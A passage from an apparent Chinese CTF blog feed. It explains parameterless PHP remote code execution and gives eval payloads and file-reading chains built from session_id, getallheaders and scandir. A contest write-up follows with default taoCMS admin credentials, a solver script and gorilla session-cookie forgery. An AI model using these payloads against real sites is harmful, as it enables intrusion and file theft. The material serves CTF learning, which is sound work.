class="code"><pre><span class="line">preg_replace 的主要功能就是限制我们传输进来的必须是纯小写字母的函数，而且不能携带参数。</span><br><span class="line">再来看一下：(?R)?，这个意思为递归整个匹配模式。所以正则的含义就是匹配无参数的函数，内部可以无限嵌套相同的模式（无参数函数）</span><br><span class="line"></span><br><span class="line">preg_match的主要功能就是过滤函数，把一些常用不带参数的函数关键部分都给过滤了，需要去构造别的方法去执行命令。</span><br></pre></td></tr></table></figure><p>说白了就是传入的参数不能含有参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">scandir（&#x27;a()&#x27;）//可以使用，里面没有参数</span><br><span class="line">scandir（&#x27;123&#x27;）//不可以使用，里面有参数</span><br></pre></td></tr></table></figure><p>所谓无参数<code>RCE</code>说白了就是使用一个个的函数来达到我们的目的。<br> 例如<code>print_r(array_reverse(scandir(current(localeconv()))))</code><br> 接下来就说说由哪些方法能完成RCE<br> <strong>测试代码</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (&#x27;;&#x27; === preg_replace(&#x27;/[^\W]+\((?R)?\)/&#x27;, &#x27;&#x27;, $_GET[&#x27;code&#x27;])) &#123;</span><br><span class="line">    eval($_GET[&#x27;code&#x27;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="0x01关于无参数RCE的一些方法"><a href="#0x01关于无参数RCE的一些方法" class="headerlink" title="0x01关于无参数RCE的一些方法"></a>0x01关于无参数RCE的一些方法</h1><h2 id="方法一-利用session-id"><a href="#方法一-利用session-id" class="headerlink" title="方法一 利用session_id"></a>方法一 利用session_id</h2><p>利用<code>http headers</code>传参，然而<code>http</code>中有那么多的内容，最容易想到的估计就是<code>cookies</code>传递参数。<br> 在php中有一个函数<code>session_id</code>可以用来获取&#x2F;设置当前会话ID，并且这个值是我们可控的。但是它的使用有些限制： 文件会话管理器仅允许会话 ID 中使用以下字符：a-z A-Z 0-9 ,（逗号）和 - 减号 ，但是这并不影响我们操作。我们可以使用十六进制传入，之后使用<code>hex2bin()</code>函数转换即可。但是使用<code>session_id</code>的时候必须要开启<code>session</code>才可以，需要<code>session_start</code><br> 构造payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?code=eval(hex2bin(session_id(session_start())));</span><br><span class="line">hex(&quot;phpinfo();&quot;)=706870696e666f28293b</span><br></pre></td></tr></table></figure><p><img src="/2023/10/16/%E6%97%A0%E5%8F%82RCE/image/image-20231013154315987-1700990134691-53-1700994502483-26.png"></p><h2 id="方法二-利用get-defined-vars-函数"><a href="#方法二-利用get-defined-vars-函数" class="headerlink" title="方法二 利用get_defined_vars ()函数"></a>方法二 利用get_defined_vars ()函数</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get_defined_vars()：返回由所有已定义变量所组成的数组</span><br></pre></td></tr></table></figure><p>我们通过<code>get</code>或者<code>post</code>方法，传入的参数，以及它的值可以被<code>get_defined_vars()</code>读出来。而且它返回的还是数组，那么我们可以通过php中的一系列对数组操作的函数来得到我们想要的值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">end() - 将内部指针指向数组中的最后一个元素，并输出。</span><br><span class="line">next() - 将内部指针指向数组中的下一个元素，并输出。</span><br><span class="line">prev() - 将内部指针指向数组中的上一个元素，并输出。</span><br><span class="line">reset() - 将内部指针指向数组中的第一个元素，并输出。</span><br><span class="line">each() - 返回当前元素的键名和键值，并将内部指针向前移动。</span><br><span class="line">current() -输出数组中的当前元素的值。</span><br></pre></td></tr></table></figure><p>构造payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=print_r(current(get_defined_vars()));&amp;b=phpinfo();</span><br></pre></td></tr></table></figure><p><img src="/2023/10/16/%E6%97%A0%E5%8F%82RCE/image/image-20231013154330409-1700990134690-51-1700994502483-25.png"></p><p>查看最后一个数组，且eval</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=eval(end(current(get_defined_vars())));&amp;b=phpinfo();</span><br></pre></td></tr></table></figure><p><img src="/2023/10/16/%E6%97%A0%E5%8F%82RCE/image/image-20231013154343786-1700990134690-52-1700994502483-27.png"></p><h2 id="方法三-利用getallheaders"><a href="#方法三-利用getallheaders" class="headerlink" title="方法三 利用getallheaders()"></a>方法三 利用getallheaders()</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getallheaders返回当前请求的所有请求头信息</span><br></pre></td></tr></table></figure><p><img src="/2023/10/16/%E6%97%A0%E5%8F%82RCE/image/image-20231013154359144-1700990134691-54-1700994502483-28.png"></p><p>尝试写入phpinfo（）</p><p><img src="/2023/10/16/%E6%97%A0%E5%8F%82RCE/image/image-20231013154409805-1700990134691-55-1700994502483-30.png"></p><p>之后就可用数组操作的函数拿出phpinfo（）且执行。<br> 构造payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=eval(next(getallheaders()));</span><br></pre></td></tr></table></figure><p><img src="/2023/10/16/%E6%97%A0%E5%8F%82RCE/image/image-20231013154420985-1700990134691-56-1700994502483-29.png"></p><h2 id="方法四-getenv"><a href="#方法四-getenv" class="headerlink" title="方法四 getenv()"></a>方法四 getenv()</h2><p><code>getenv() ：获取环境变量的值(在PHP7.1之后可以不给予参数)</code><br> 看简介就明白，它并不适用于PHP&lt;7.1的版本，我的版本不合适，报了400错误，往里面传参也不行。</p><p><img src="/2023/10/16/%E6%97%A0%E5%8F%82RCE/image/image-20231013154438342-1700990134691-57-1700994502483-31.png"></p><p>没有成功，好在这种方法使用限制比较多，使用也相对比较少。</p><h2 id="方法五-scandir"><a href="#方法五-scandir" class="headerlink" title="方法五 scandir()"></a>方法五 scandir()</h2><p>这种方法是使用比较多的，相对而言比较多变，各个函数相辅相成。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">scandir()  //函数返回指定目录中的文件和目录的数组。</span><br><span class="line">localeconv()   //返回一包含本地数字及货币格式信息的数组。</span><br><span class="line">current()     //返回数组中的单元，默认取第一个值。</span><br><span class="line">pos是current的别名</span><br><span class="line">getcwd()      //取得当前工作目录</span><br><span class="line">dirname()     //函数返回路径中的目录部分。</span><br><span class="line">array_flip()  //交换数组中的键和值，成功时返回交换后的数组</span><br><span class="line">array_rand()  //从数组中随机取出一个或多个单元</span><br><span class="line">array_flip()和array_rand()配合使用可随机返回当前目录下的文件名</span><br><span class="line">dirname(chdir(dirname()))配合切换文件路径</span><br></pre></td></tr></table></figure><p><strong>示例</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(dirname(getcwd()))); //查看上一级目录的文件</span><br><span class="line">print_r(scandir(next(scandir(getcwd()))));  //查看上一级目录的文件</span><br><span class="line">show_source(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd()))))))); //读取上级目录文件</span><br><span class="line">show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(getcwd())))))))))));//读取上级目录文件</span><br><span class="line">show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion())))))))))))))));//读取上级目录文件</span><br><span class="line">show_source(array_rand(array_flip(scandir(chr(current(localtime(time(chdir(next(scandir(current(localeconv()))))))))))));//这个得爆破，不然手动要刷新很久，如果文件是正数或倒数第一个第二个最好不过了，直接定位</span><br><span class="line">print_r(scandir(chr(ord(strrev(crypt(serialize(array())))))));  //查看和读取根目录文件</span><br><span class="line">if(chdir(chr(ord(strrev(crypt(serialize(array())))))))print_r(scandir(getcwd()));  //查看和读取根目录文件</span><br></pre></td></tr></table></figure><p>由此可以看出各个函数相互利用，组合方法有很多</p><h1 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h1><p>知识不经过组合利用就不会起作用</p><h2 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h2><p>dirsearch扫目录得<code>/.git</code> 利用githack得源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line">echo &quot;flag在哪里呢？&lt;br&gt;&quot;;</span><br><span class="line">if(isset($_GET[&#x27;exp&#x27;]))&#123;</span><br><span class="line">    if (!preg_match(&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;, $_GET[&#x27;exp&#x27;])) &#123;</span><br><span class="line">        if(&#x27;;&#x27; === preg_replace(&#x27;/[a-z,_]+\((?R)?\)/&#x27;, NULL, $_GET[&#x27;exp&#x27;])) &#123;</span><br><span class="line">            if (!preg_match(&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;, $_GET[&#x27;exp&#x27;])) &#123;</span><br><span class="line">                // echo $_GET[&#x27;exp&#x27;];</span><br><span class="line">                @eval($_GET[&#x27;exp&#x27;]);</span><br><span class="line">            &#125;</span><br><span class="line">            else&#123;</span><br><span class="line">                die(&quot;还差一点哦！&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            die(&quot;再好好想想！&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        die(&quot;还想读flag，臭弟弟！&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">// highlight_file(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>查看代码，很明显的无参数RCE<br> 其中<code>(?R)</code>引用当前表达式，后面加了?递归调用。只能匹配通过无参数的函数<br> <code>scandir(&#39;.&#39;)</code>返回当前目录，但是如何构造<code>.</code> 函数<code>localeconv()</code> 返回一包含本地数字及货币格式信息的数组。   但是其数组第一项就是<code>.</code>， <code>current()/pos()</code>返回数组中的当前单元, 默认取第一个值。<br> 构造payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=print_r(scandir(pos(localeconv())));</span><br></pre></td></tr></table></figure><p><img src="/2023/10/16/%E6%97%A0%E5%8F%82RCE/image/image-20231013154457471-1700990134691-58-1700994502483-33.png"></p><p>利用对数组操作的函数读取flag<br> 利用<code>array_reverse()</code> 将数组内容反转一下  ， 利用<code>next()</code>指向第二个元素，也就是flag.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=show_source(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure><p><img src="/2023/10/16/%E6%97%A0%E5%8F%82RCE/image/image-20231013154506994-1700990134691-59-1700994502483-32.png"></p><h1 id="0x02-后记"><a href="#0x02-后记" class="headerlink" title="0x02 后记"></a>0x02 后记</h1><p>在没学习之前觉得这个知识点可能会很难，现在倒也觉得没有我想的那么难。有些东西做了才知道深浅。继续加油吧。</p><p><strong>参考</strong><br> <a href="https://blog.csdn.net/qq_38154820/article/details/107171940">https://blog.csdn.net/qq_38154820/article/details/107171940</a><br> <a href="https://blog.csdn.net/qq_45570082/article/details/106602261">https://blog.csdn.net/qq_45570082/article/details/106602261</a><br> <a href="https://xz.aliyun.com/t/9360#toc-6">https://xz.aliyun.com/t/9360#toc-6</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>QLNU22级最后一次校赛wp</title>
      <link href="/2023/10/07/%E6%A0%A1%E8%B5%9Bwp/"/>
      <url>/2023/10/07/%E6%A0%A1%E8%B5%9Bwp/</url>
      
        <content type="html"><![CDATA[<h1 id="校赛wp"><a href="#校赛wp" class="headerlink" title="校赛wp"></a>校赛wp</h1><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="solve-me"><a href="#solve-me" class="headerlink" title="solve_me"></a>solve_me</h3><p>先费马分解</p><p><img src="/2023/10/07/%E6%A0%A1%E8%B5%9Bwp/image/image-20231007092105405-1700994510649-43.png" alt="image-20231007092105405"></p><p>flag{fa2371c5-bf58-4502-9fea-caf12a85d1ff}</p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="Easycms"><a href="#Easycms" class="headerlink" title="Easycms"></a>Easycms</h3><p><img src="/2023/10/07/%E6%A0%A1%E8%B5%9Bwp/image/image-20231008183430859-1700994510649-44.png"></p><p>打开页面，页面显示taoCMS演示系统，想着应该有漏洞，上网搜taocms漏洞</p><p>看到文章<a href="http://blog.csdn.net/m0_46684679/article/details/129214411">http://blog.csdn.net/m0_46684679/article/details/129214411</a></p><p>访问url&#x2F;admin&#x2F;admin.php</p><p>弹出一个登录界面，</p><p><img src="/2023/10/07/%E6%A0%A1%E8%B5%9Bwp/image/image-20231008183939747-1700994510649-46.png"></p><blockquote><p>账户admin</p><p>密码tao</p></blockquote><p>登录成功，跳转到这个界面</p><p><img src="/2023/10/07/%E6%A0%A1%E8%B5%9Bwp/image/image-20231008184041682-1700994510649-45.png"></p><p>点击文件管理，进入..&#x2F;..&#x2F;..&#x2F;看到flag，点开看到flag</p><p><img src="/2023/10/07/%E6%A0%A1%E8%B5%9Bwp/image/image-20231008184157673-1700994510649-47.png"></p><p>QLNU{woW_CMs_1s_DAngeR0us_41rI9h7?_91b5e2b34cc2}</p><h3 id="Answered"><a href="#Answered" class="headerlink" title="Answered"></a>Answered</h3><p>附脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line">result = 1</span><br><span class="line">while True:</span><br><span class="line">    burp0_url = &quot;http://qlnuctf.shenghuo2.top:49194/&quot;</span><br><span class="line">    burp0_cookies = &#123;&quot;session&quot;: &quot;eyJzY29yZSI6MCwic3RhcnRfdGltZSI6MTY5NjY1NjY0OS43ODcwNTZ9.ZSDtCQ.0RE2Dez4_dd5v-o6Hk_rVi_UnpE&quot;&#125;</span><br><span class="line">    burp0_headers = &#123;&quot;Pragma&quot;: &quot;no-cache&quot;, &quot;Cache-Control&quot;: &quot;no-cache&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;,</span><br><span class="line">                     &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.55&quot;,</span><br><span class="line">                     &quot;Origin&quot;: &quot;http://qlnuctf.shenghuo2.top:49194&quot;,</span><br><span class="line">                     &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;,</span><br><span class="line">                     &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&quot;,</span><br><span class="line">                     &quot;Referer&quot;: &quot;http://qlnuctf.shenghuo2.top:49194/&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;,</span><br><span class="line">                     &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6&quot;, &quot;Connection&quot;: &quot;close&quot;&#125;</span><br><span class="line">    burp0_data = &#123;&quot;answer&quot;: result&#125;</span><br><span class="line">    res_2 = session.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)</span><br><span class="line"></span><br><span class="line">    timu_2 = re.search(r&#x27;&lt;h3&gt;(.*?)&lt;/h3&gt;&#x27;, res_2.text)</span><br><span class="line">    if &#x27;异或&#x27; in timu_2.group(1):</span><br><span class="line">        pattern = r&#x27;题目：(\d+) 异或 (\d+) = ? &#x27;</span><br><span class="line">        match = re.search(pattern, res_2.text)</span><br><span class="line">        result = int(match.group(1)) ^ int(match.group(2))</span><br><span class="line">    elif &#x27;与&#x27; in timu_2.group(1):</span><br><span class="line">            pattern = r&#x27;题目：(\d+) 与 (\d+) = ? &#x27;</span><br><span class="line">            match = re.search(pattern, res_2.text)</span><br><span class="line">            result = int(match.group(1)) &amp; int(match.group(2))</span><br><span class="line">    else:</span><br><span class="line">            pattern = r&#x27;题目：(\d+) (.) (\d+) = ? &#x27;</span><br><span class="line">            match = re.search(pattern, res_2.text)</span><br><span class="line">            group_1 = int(match.group(1))</span><br><span class="line">            group_3 = int(match.group(3))</span><br><span class="line">    if match.group(2) == &#x27;+&#x27;:</span><br><span class="line">        result = group_1 + group_3</span><br><span class="line">    elif match.group(2) == &#x27;-&#x27;:</span><br><span class="line">        result = group_1 - group_3</span><br><span class="line">    elif match.group(2) == &#x27;x&#x27;:</span><br><span class="line">        result = group_1 * group_3</span><br><span class="line">    elif match.group(2) == &#x27;÷&#x27;:</span><br><span class="line">        result = group_1 // group_3</span><br><span class="line">    if &quot;flag&quot; in res_2.text:</span><br><span class="line">        print(res_2.text)</span><br><span class="line">    time.sleep(1)</span><br></pre></td></tr></table></figure><p><img src="/2023/10/07/%E6%A0%A1%E8%B5%9Bwp/image/image-20231007144755630-1700994510649-50.png"></p><p>小tips：有一点难的是就是，发的包需要是完整的，加上session（最主要的），之前没有完整的数据包，搞了半天不行。。。</p><h3 id="EasyGo"><a href="#EasyGo" class="headerlink" title="EasyGo"></a>EasyGo</h3><p>下载附件，是用go的<a href="http://so.csdn.net/so/search?q=gin%E6%A1%86%E6%9E%B6&spm=1001.2101.3001.7020">gin框架</a>写的后端，cookie-session是由<a href="http://github.com/gorilla/sessions">gorilla&#x2F;sessions</a>来实现，而sessions库使用了另一个库：<a href="http://github.com/gorilla/securecookie">gorilla&#x2F;securecookie</a>来实现对cookie的安全传输。</p><p>查看源码，发现主要部分在route.go部分，需要admin才有权限查看文件得到flag</p><p>总共有两个路由，一个“&#x2F;“路由，一个”&#x2F;readflag”路由</p><p>根路由 &#x2F;</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;main/route&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line"></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">r := gin.Default()</span><br><span class="line">r.GET(<span class="string">&quot;/&quot;</span>, route.Index)</span><br><span class="line">r.GET(<span class="string">&quot;/readflag&quot;</span>, route.Readflag)</span><br><span class="line">r.Run(<span class="string">&quot;0.0.0.0:8000&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最主要的一部分</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">var store = sessions.NewCookieStore([]byte(os.Getenv(&quot;SESSION_KEY&quot;)))</span><br><span class="line"></span><br><span class="line">func Index(c *gin.Context) &#123;</span><br><span class="line">session, err := store.Get(c.Request, &quot;session-name&quot;)</span><br><span class="line">if err != nil &#123;</span><br><span class="line">http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line">return</span><br><span class="line">&#125;</span><br><span class="line">if session.Values[&quot;name&quot;] == nil &#123;</span><br><span class="line">session.Values[&quot;name&quot;] = &quot;User&quot;</span><br><span class="line">err = session.Save(c.Request, c.Writer)</span><br><span class="line">if err != nil &#123;</span><br><span class="line">http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line">return</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">c.String(200, &quot;Hello, User. How to become admin?&quot;)</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，这里将判断是否携带了cookie，如果cookie中的name为空，就将其设置为user。并且有一个细节，无论是否是管理员，根路由永远都会返回Hello, User. How to become admin?</p><p>想到需要伪造session</p><p>上面通过获取环境变量中的SESSION_KEY来获取生成securecookie。只能对SESSION_KEY进行猜测，猜测并未设置SESSION_KEY。在本地运行程序，将SESSION_KEY置为空从而伪造cookie。</p><p>这里将route.go修改一下</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> store = sessions.NewCookieStore([]<span class="type">byte</span>(os.Getenv(<span class="string">&quot;SESSION_KEY&quot;</span>)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Index</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">session, err := store.Get(c.Request, <span class="string">&quot;session-name&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> session.Values[<span class="string">&quot;name&quot;</span>] == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">session.Values[<span class="string">&quot;name&quot;</span>] = <span class="string">&quot;admin&quot;</span></span><br><span class="line">err = session.Save(c.Request, c.Writer)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">c.String(<span class="number">200</span>, <span class="string">&quot;Hello, User. How to become admin?&quot;</span>)</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后在附件目录</p><p>命令行go run main.go</p><p>之后访问127.0.0.1:8000获取session</p><p><img src="/2023/10/07/%E6%A0%A1%E8%B5%9Bwp/image/image-20231008185921131-1700994510649-48.png"></p><p>得到session</p><blockquote><p>MTY5NjY1NDM2M3xEWDhFQVFMX2dBQUJFQUVRQUFBal80QUFBUVp6ZEhKcGJtY01CZ0FFYm1GdFpRWnpkSEpwYm1jTUJ3QUZZV1J0YVc0PXx83HZpaT0T7b2lYtEd0cAmvQ_sS926v-ycwnspOHOOGw&#x3D;&#x3D;</p></blockquote><p><img src="/2023/10/07/%E6%A0%A1%E8%B5%9Bwp/image/image-20231008190015859-1700994510649-51.png"></p><p>这里呼应前面修改之后他不跳转，一直显示Hello, User. How to become admin?，修改之后需要访问url&#x2F;readflag才能看到回显</p><p>访问url&#x2F;readflag可以看到出现了你已经是admin，怎么获得flag</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> session.Values[<span class="string">&quot;name&quot;</span>] == <span class="string">&quot;admin&quot;</span> &#123;</span><br><span class="line">c.String(<span class="number">200</span>, <span class="string">&quot;Congratulation! You are admin,But how to get flag?\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">path := c.Query(<span class="string">&quot;filename&quot;</span>)</span><br><span class="line"></span><br><span class="line">reg := regexp.MustCompile(<span class="string">`[b-zA-Z_@#%^&amp;*:&#123;|&#125;+&lt;&gt;&quot;;\[\]]`</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> reg.MatchString(path) &#123;</span><br><span class="line">http.Error(c.Writer, <span class="string">&quot;nonono&quot;</span>, http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>读源码看到需要filename读文件，过滤了好多字符，没过滤？通配符读flag就好</p><p><img src="/2023/10/07/%E6%A0%A1%E8%B5%9Bwp/image/image-20231007151052327-1700994510649-49.png"></p><h3 id="Nodejs"><a href="#Nodejs" class="headerlink" title="Nodejs"></a>Nodejs</h3><p>这个题基本上原题了。。。。原题是贵阳大数据及网络安全精英对抗赛的JUST_PROTO</p><p><a href="http://cloud.tencent.com/developer/article/2282627">http://cloud.tencent.com/developer/article/2282627</a></p><p>下载附件直接看源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">const express = require(&#x27;express&#x27;);</span><br><span class="line">const &#123; exec &#125; = require(&quot;child_process&quot;);</span><br><span class="line">const app = express();</span><br><span class="line"></span><br><span class="line">app.get(&#x27;/&#x27;, (req, res) =&gt; </span><br><span class="line">    